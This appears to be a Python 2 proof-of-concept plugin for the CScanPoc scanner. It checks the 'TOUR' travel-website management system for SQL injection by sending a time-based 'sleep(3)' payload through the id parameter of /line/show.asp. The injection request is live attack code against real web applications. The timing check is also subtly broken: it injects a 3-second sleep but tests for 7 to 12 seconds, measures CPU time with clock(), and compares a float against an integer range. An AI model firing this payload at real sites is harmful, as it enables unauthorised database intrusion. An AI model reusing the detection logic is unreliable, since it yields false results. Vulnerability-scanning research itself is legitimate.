# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
from time import clock

class Vuln(ABVuln):
    vuln_id = 'TOUR_0001' # 平台漏洞编号，留空
    name = 'TOUR旅游网站管理系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-04-20'  # 漏洞公布时间
    desc = '''
        TOUR旅游网站管理系统存在SQL注入，服务商、CMS版本不明，很多旅游网站在用。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'TOUR旅游网站管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a18f706c-9292-49bc-9f1b-3e90ef306d2f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            # 参考：http://www.wooyun.org/bugs/wooyun-2014-057623
            verity_url = self.target + '/line/show.asp?id=926%27%20and%20sleep%283%29--%201'
            start = clock()
            r = requests.get(verity_url)
            response = r.text
            if r.status_code == 200:
                if response.find('<script language=javascript>alert') != -1 or clock()-start in range(7, 12):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
